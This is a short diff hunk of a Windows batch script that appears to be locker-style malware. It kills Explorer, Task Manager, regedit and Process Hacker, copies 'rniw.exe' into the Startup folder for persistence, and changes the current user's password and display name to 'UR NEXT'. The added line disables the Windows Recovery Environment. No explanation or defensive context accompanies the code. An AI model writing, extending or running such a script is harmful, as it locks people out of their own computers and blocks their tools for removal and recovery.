@@ -3,6 +3,7 @@ taskkill /f /im explorer.exe
 taskkill /f /im taskmgr.exe
 taskkill /f /im regedit.exe
 taskkill /f /im ProcessHacker.exe
+reagentc.exe /disable
 copy %temp%\rniw.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\rniw.exe"
 net user %username% URNEXT
 wmic useraccount where name='%username%' set FullName='UR NEXT'
